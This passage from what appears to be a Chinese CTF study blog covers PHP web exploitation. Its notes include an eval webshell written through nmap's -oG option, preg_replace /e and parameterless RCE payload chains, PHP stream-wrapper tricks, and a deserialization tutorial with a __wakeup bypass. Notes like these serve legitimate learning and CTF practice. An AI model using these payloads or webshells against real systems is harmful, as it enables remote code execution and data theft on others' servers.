a=1&#39;</code>，因为包围127.0.0.1的单引号产生了闭合，<code>\\</code>被解释为\，中间的两个单引号’’完成了闭合，最终留下了a&#x3D;1’，也就是末尾的单引号</p><p>两边加上单引号<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code>可绕过</p><p>preg_replace()的&#x2F;e模式存在命令执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">  @eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>固定解题格式： <code>\S*=$&#123;&#125;</code><br><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code><br>姿势一：使用<code>php://input</code>伪协议通过post传参需要注意请求包的类型是post<br><img src="/img/206.png"><br>姿势二：<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= // d2VsY29tZSB0byB0aGUgempjdGY= 解码后为 -----&gt;  welcome to the zjctf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&#x27;flag.php&#x27;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line">__tostring()方法在题目中</span><br><span class="line">$password = unserialize($password);</span><br><span class="line">echo $password; //触发魔术方法</span><br></pre></td></tr></table></figure><p>X-Requested-With: XMLHttpRequest&#x2F;&#x2F;通常在发送 XMLHttpRequest 对象发起 AJAX 请求时<br>AJAX 请求:使用指一种创建交互式、快速动态网页应用的网页开发技术,好像和xml有关<br><img src="/img/207.png"><br>python dirsearch.py -u <a href="http://f921948c-4523-4885-a45b-936776836ace.node4.buuoj.cn:81/">http://f921948c-4523-4885-a45b-936776836ace.node4.buuoj.cn:81/</a> -e.php<br>python dirsearch.py -u URL -e.php<br>要有F12查看源代码查找flag的好习惯<br><code>$a = json_decode($_GET[&#39;json&#39;],true);</code><br>返回一个json数据格式解码后的关联数组<br>json &#x3D; {“x”:”wllm”}解码后就是</p><h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><h3 id="方法一：利用scandir"><a href="#方法一：利用scandir" class="headerlink" title="方法一：利用scandir()"></a>方法一：利用scandir()</h3><p> 扫描当前目录内容 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv()))); </span><br></pre></td></tr></table></figure><p>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。</p><p>可以看到当前目录下有flag.php。 </p><p><img src="/img/image-20231103210617480.png" alt="image-20231103210617480"></p><p>通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名</span><br><span class="line">next() 输出数组中的当前元素和下一个元素的值。</span><br><span class="line">array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">pos() 输出数组中的当前元素的值。</span><br><span class="line">localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231103210652828.png" alt="image-20231103210652828"></p><p>读取当前目录倒数第一位文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><p><code>getcwd()</code> 函数用于获取当前工作目录的路径（当前工作目录是指PHP脚本正在执行的目录）。这个函数不需要任何参数，直接调用即可</p><p>读取当前目录倒数第二位文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>随机返回当前目录文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>扫描上一级目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><p><code>dirname()</code> 函数用于返回指定路径的目录部分。它会返回给定路径的父目录路径</p><p>读取上级目录文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure><p>查看和读取根目录文件:</p><p>所获得的字符串第一位有几率是&#x2F;，需要多试几次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure><p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p><h3 id="方法二：利用session-id（）"><a href="#方法二：利用session-id（）" class="headerlink" title="方法二：利用session_id（）"></a>方法二：利用session_id（）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">法一：</span><br><span class="line">?exp=highlight_file(session_id(session_start()));</span><br><span class="line">请求头：</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br><span class="line"></span><br><span class="line">法二 ：</span><br><span class="line">?exp=eval(hex2bin(session_id(session_start())));</span><br><span class="line">Cookie: PHPSESSID=706870696e666f28293b    //为什么要编码，因为PHPSESSID不允许括号</span><br><span class="line">(706870696e666f28293b为phpinfo();的十六进制编码)</span><br></pre></td></tr></table></figure><p>在[GXYCTF2019]禁止套娃1中过滤掉了hex,但是我们已知flag.php是我们要读取的，所以直接法一即可</p><p>session_start()开启session服务，session_id（）读取参数内容，hex2bin使16进制转换为字符串，因为SESSIONID只能为字母和数字</p><p><img src="/img/image-20231123211213371.png" alt="image-20231123211213371"></p><h3 id="方法三：利用get-defined-vars（）"><a href="#方法三：利用get-defined-vars（）" class="headerlink" title="方法三：利用get_defined_vars（）"></a>方法三：利用get_defined_vars（）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(get_defined_vars());   //var_dump</span><br></pre></td></tr></table></figure><p><code> get_defined_vars()</code>是一个 PHP 函数，用于获取当前作用域中已定义的所有变量的列表，并将它们存储在一个关联数组中</p><p><img src="/img/image-20231104001910198.png" alt="image-20231104001910198"></p><p>也可以右键源代码更加直观</p><p><img src="/img/image-20231112230337261.png" alt="image-20231112230337261"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post传参：1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104002343239.png" alt="image-20231104002343239"></p><p>我们可以将数组弹出，来间接获取我们想要的payload，从而达到绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print(array_pop((next((get_defined_vars())))));</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231104003019833.png" alt="image-20231104003019833"></p><p>我们这里也是直接将post传参改成我们需要的了</p><p><img src="/img/image-20231104003059244.png" alt="image-20231104003059244"></p><p>直接配合嵌套eval函数</p><p>逻辑是内层eval执行返回<code>system(&quot;cat flag.php&quot;);</code>,然后外层eval执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop((next((get_defined_vars())))));</span><br><span class="line">?c=eval(array_pop((current((get_defined_vars())))));</span><br></pre></td></tr></table></figure><p><code>current()</code> 函数用于返回数组中的当前元素的值</p><p><img src="/img/image-20231104003153294.png" alt="image-20231104003153294"></p><p>需要注意的是方法二和方法三都要用到嵌套eval才能执行</p><h3 id="方法四：利用getallheaders"><a href="#方法四：利用getallheaders" class="headerlink" title="方法四：利用getallheaders()"></a>方法四：利用getallheaders()</h3><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。<code>implode()</code>能够直接将<code>getallheaders()</code>返回的数组转化为字符串</p><p><img src="/img/image-20231123210800598.png" alt="image-20231123210800598"></p><p>可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p><p><img src="/img/image-20231123210811018.png" alt="image-20231123210811018"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=eval(implode(getallheaders()));</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://baijiahao.baidu.com/s?id=1722200646272849215&wfr=spider&for=pc">使用无参数函数进行命令执行</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/124538469">[GXYCTF2019]禁止套娃1（两种方法）</a></p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">无参数RCE总结</a></p><p>全：</p><p><a href="https://blog.csdn.net/2301_76690905/article/details/133808536">无参数RCE绕过的详细总结（六种方法）</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"/>
      <url>/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</url>
      
        <content type="html"><![CDATA[<h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>序列化是将对象的状态信息(属性)转换为可以存储或输出的形式的过程，php就是将对象或者数组转化为可存储&#x2F;传输的字符串</p><h2 id="常见序列化格式"><a href="#常见序列化格式" class="headerlink" title="常见序列化格式"></a>常见序列化格式</h2><table><thead><tr><th>类型</th><th>示例</th><th>格式</th></tr></thead><tbody><tr><td>空字符</td><td>null</td><td>N;</td></tr><tr><td>整形</td><td>666</td><td>i:666;</td></tr><tr><td>浮点型</td><td>66.6</td><td>d:66.6;</td></tr><tr><td>boolean型</td><td>true</td><td>b:1;</td></tr><tr><td></td><td>false</td><td>b:0;</td></tr><tr><td>字符串</td><td>‘benben’</td><td>s:6:”benben”;</td></tr></tbody></table><p><strong>数组</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array(&#x27;benben&#x27;,&#x27;dazhuang&#x27;,&#x27;laoliu&#x27;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">输出：a:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhuang&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span><br></pre></td></tr></table></figure><p>a指的是array，3是数组的成员数量，i后面的数字是数组成员编号<br>下面重点讲解对象的序列化</p><h2 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化的是对象而不是类，对象是类的实例化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O(object):4(类名长度):&quot;test&quot;(类名):1(变量数量):&#123;s:3(变量名字长度):&quot;pub&quot;(变量名字);s:6(值的长度):&quot;benben&quot;(变量值);&#125;</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure><p>默认只会序列化成员属性，不会序列化成员函数<br>注意：1、当成员属性是private私有属性序列化时在变量名前加”%00类名%00”,但空格在生成的poc中会变成小方块,所以在序列化时经常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(serialize($value));</span><br></pre></td></tr></table></figure><p>进行url编码，使空格显示为%00</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">序列化后：O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;testpub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>2、成员属性是protected受保护的进行序列化时在变量名前加”%00*%00”,变量名字长度同样要改变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">序列化后：O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;*pub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>3、成员属性调用实例化后的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ben=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ben&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞的成因"><a href="#反序列化漏洞的成因" class="headerlink" title="反序列化漏洞的成因"></a>反序列化漏洞的成因</h2><p>首先需要知道的是发序列化生成的对象里的成员属性值是由反序列化里的值提供的，于原来类预定义的值无关。那么漏洞成因就是在反序列化过程中unserialize的字符串可控，通过更改这个字符串，反序列化后就可以得到所需要的代码，即生成的对象的属性值<br>做反序列化的题目，我们需要知道的是反序列化不改变类的成员方法，需要调用方法后才能触发</p><h2 id="反序列化中常见的魔术方法"><a href="#反序列化中常见的魔术方法" class="headerlink" title="反序列化中常见的魔术方法"></a>反序列化中常见的魔术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_construct() //实例化对象</span><br><span class="line">__destruct() //对象引用完成或对象被销毁反序列化之后</span><br><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__get() //调用的成员属性不存在</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br></pre></td></tr></table></figure><p><strong>_destruct()触发</strong><br>1、实例化对象，因为对象被创建最后用完一定会被销毁<br>2、反序列化，因为反序列化那串字符串后如果是个对象，一样后面会被销毁</p><h2 id="计算机漏洞安全相关的概念POC-、EXP-、VUL-、CVE-、0DAY"><a href="#计算机漏洞安全相关的概念POC-、EXP-、VUL-、CVE-、0DAY" class="headerlink" title="计算机漏洞安全相关的概念POC 、EXP 、VUL 、CVE 、0DAY"></a>计算机漏洞安全相关的概念POC 、EXP 、VUL 、CVE 、0DAY</h2><p><a href="https://blog.csdn.net/qq_37622608/article/details/88048847">https://blog.csdn.net/qq_37622608/article/details/88048847</a></p><h2 id="字符串逃逸基础"><a href="#字符串逃逸基础" class="headerlink" title="字符串逃逸基础"></a>字符串逃逸基础</h2><p>在前面字符串没有问题的情况下，反序列化以;}结束，后面的字符串不影响正常的反序列化</p><h3 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h3><p>一般在数据先经过一次serialize在经过unserialize，在这个中间反序列化的字符串变多或者变少的时候才有可能存在反序列化属性逃逸</p><h2 id="字符减少和字符增加"><a href="#字符减少和字符增加" class="headerlink" title="字符减少和字符增加"></a>字符减少和字符增加</h2><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>在反反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。<br>影响版本<br>php5.0.0 ~ php5.6.25<br>php7.0.0 ~ php7.0.10</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$filename</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>php语言的特性为在反序列化时，先执行__wakeup()魔术方法，才会执行__destruct()魔术方法<br>也就是说当我们使用payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">      private $filename = &#x27;flag.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">echo urlencode(serialize(new A()));</span><br></pre></td></tr></table></figure><p>反序列化时修改的$filename的值在__wakeup()函数时由flag.php修改为了test.txt<br>绕过__wakeup()函数时将对象属性个数的值大于真实的属性个数时即可绕过<br>即O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22%00A%00filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D只需要将对象个数大于1即可，2，3，4等等都行</p><h2 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h2><p><img src="/img/78.png"></p><h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><p>当session_start()被调用或者php.ini中的session.auto_start为1时，PHP内部调用会话管理器，访问用户被序列化以后，储存到指定目录(默认为&#x2F;tmp)<br>存取数据的格式有多种，常用的有三种<br>漏洞产生：写入格式和读取格式不一致<br><img src="/img/79.png"><br>默认情况下用php格式储存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?ben=dazhuang</span><br><span class="line">benben|s:<span class="number">8</span>:<span 